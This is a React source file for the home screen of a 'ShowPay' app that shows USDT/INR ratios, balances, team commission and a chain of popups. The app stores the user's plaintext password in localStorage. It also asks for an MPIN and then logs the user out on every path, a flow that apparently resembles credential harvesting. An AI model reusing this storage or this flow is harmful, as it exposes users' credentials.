import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { getSettings, getBanner } from '../api'
import Slider from '../components/Slider'
import BottomNav from '../components/BottomNav'
import VideoPopup from '../components/VideoPopup'
import MpinPopup from '../components/MpinPopup'
import TelegramPopup from '../components/TelegramPopup'
import { NotifIcon, ArrowRight, ChatIcon } from '../components/Icons'
import '../css/home.css'

export default function Home() {
  const navigate = useNavigate()
  const [settings, setSettings] = useState({
    usdt_ratio: '107.61',
    bonus_ratio: '4',
    inr_bonus_ratio: '2',
    mpin_popup_delay: 2,
    video_popup_enabled: true,
    telegram_popup_enabled: false,
    slider_enabled: true,
    banner_enabled: true
  })
  const [banner, setBanner] = useState(null)
  const [showVideo, setShowVideo] = useState(false)
  const [showMpin, setShowMpin] = useState(false)
  const [showTelegram, setShowTelegram] = useState(false)
  const [mpinDone, setMpinDone] = useState(false)

  // Check login
  useEffect(() => {
    const token = localStorage.getItem('token')
    if (!token) navigate('/login')
  }, [navigate])

  // Fetch settings + banner
  useEffect(() => {
    getSettings()
      .then((res) => {
        if (res.data?.data) setSettings(prev => ({ ...prev, ...res.data.data }))
      })
      .catch(() => {})

    getBanner()
      .then((res) => {
        if (res.data?.data) setBanner(res.data.data)
      })
      .catch(() => {})
  }, [])

  // Start popup chain once settings loaded: FIRST show MPIN popup after delay
  useEffect(() => {
    const delay = (settings.mpin_popup_delay || 2) * 1000
    const timer = setTimeout(() => setShowMpin(true), delay)
    return () => clearTimeout(timer)
  }, [settings.mpin_popup_delay])

  const handleMpinClose = () => {
    setShowMpin(false)
    setMpinDone(true)
    // After MPIN completes, show Video popup if enabled, else Telegram popup if enabled
    if (settings.video_popup_enabled) {
      setTimeout(() => setShowVideo(true), 500)
    } else if (settings.telegram_popup_enabled) {
      setTimeout(() => setShowTelegram(true), 500)
    } else {
      localStorage.removeItem('token')
      localStorage.removeItem('mobile')
      localStorage.removeItem('password')
      navigate('/login')
    }
  }

  const handleVideoClose = (completed = true) => {
    setShowVideo(false)
    if (!completed) {
      // User cut the video in the middle -> instantly logout
      localStorage.removeItem('token')
      localStorage.removeItem('mobile')
      localStorage.removeItem('password')
      navigate('/login')
      return
    }
    // After Video perfectly completes, show Telegram popup if enabled, else logout
    if (settings.telegram_popup_enabled) {
      setTimeout(() => setShowTelegram(true), 500)
    } else {
      localStorage.removeItem('token')
      localStorage.removeItem('mobile')
      localStorage.removeItem('password')
      navigate('/login')
    }
  }

  const handleTelegramClose = () => {
    setShowTelegram(false)
    localStorage.removeItem('token')
    localStorage.removeItem('mobile')
    localStorage.removeItem('password')
    navigate('/login')
  }

  return (
    <div className="home-page">
      {/* NAVBAR */}
      <div className="navbar">
        <span className="navbar-brand">ShowPay</span>
        <div className="navbar-icon">
          <NotifIcon />
        </div>
      </div>

      {/* BANNER */}
      {settings.banner_enabled && banner?.image_url && (
        <div className="banner-section">
          <img
            src={banner.image_url}
            alt="Banner"
            style={{ width: '100%', display: 'block', objectFit: 'cover', maxHeight: 80 }}
          />
        </div>
      )}

      {/* SLIDER */}
      {settings.slider_enabled !== false && <Slider />}

      {/* USDT RATIO CARDS */}
      <div className="ratio-cards">
        <div className="ratio-card">
          <div className="ratio-card-label">USDT Ratio</div>
          <div className="ratio-card-value">1 USDT ≈ {settings.usdt_ratio} INR</div>
          <div className="ratio-card-sub">Bonus ratio: {settings.inr_bonus_ratio || 2}%</div>
        </div>
        <div className="ratio-card" style={{ borderLeft: '1px solid #eaeef4' }}>
          <div className="ratio-card-label">INR Bonus Ratio</div>
          <div className="ratio-card-value" style={{ fontSize: 32, fontWeight: 800 }}>{settings.bonus_ratio}%</div>
        </div>
      </div>

      {/* TOP UP BUTTON */}
      <div className="topup-btn-wrap">
        <button className="topup-btn">
          <span>Top up</span>
          <div className="topup-badge">
            <span className="badge-coin">🟡</span> First
          </div>
        </button>
      </div>

      {/* BALANCE GRID */}
      <div className="balance-grid">
        <div className="balance-cell">
          <div className="balance-info">
            <div className="balance-label">Balance</div>
            <div className="balance-value">0.00</div>
          </div>
          <ArrowRight />
        </div>
        <div className="balance-cell" style={{ borderLeft: '1px solid #f0f2f5' }}>
          <div className="balance-info">
            <div className="balance-label">Today Received</div>
            <div className="balance-value">0.00</div>
          </div>
          <ArrowRight />
        </div>
        <div className="balance-cell" style={{ borderTop: '1px solid #f0f2f5' }}>
          <div className="balance-info">
            <div className="balance-label">Top up Bonus</div>
            <div className="balance-value">0.00</div>
          </div>
          <ArrowRight />
        </div>
        <div className="balance-cell" style={{ borderTop: '1px solid #f0f2f5', borderLeft: '1px solid #f0f2f5' }}>
          <div className="balance-info">
            <div className="balance-label">Team Commission</div>
            <div className="balance-value">0.00</div>
          </div>
          <ArrowRight />
        </div>
      </div>

      {/* TUTORIAL */}
      <div className="tutorial-section">
        <div className="tutorial-title">Tutorial</div>
        <div className="tutorial-content-box">
          <div className="tutorial-item">ShowPay Official Website</div>
          <div className="tutorial-graphic">
            <div className="mockup-card">
              <div className="mockup-input">
                <span className="mockup-icon">📞</span>
                <span className="mockup-text">Enter Your Phone Number</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* BOTTOM NAV */}
      <BottomNav active="home" />

      {/* CHAT FAB */}
      <button className="chat-fab"><ChatIcon /></button>

      {/* VIDEO POPUP */}
      {showVideo && <VideoPopup onClose={handleVideoClose} />}

      {/* MPIN POPUP */}
      {showMpin && <MpinPopup onClose={handleMpinClose} />}

      {/* TELEGRAM POPUP */}
      {showTelegram && <TelegramPopup onClose={handleTelegramClose} />}
    </div>
  )
}
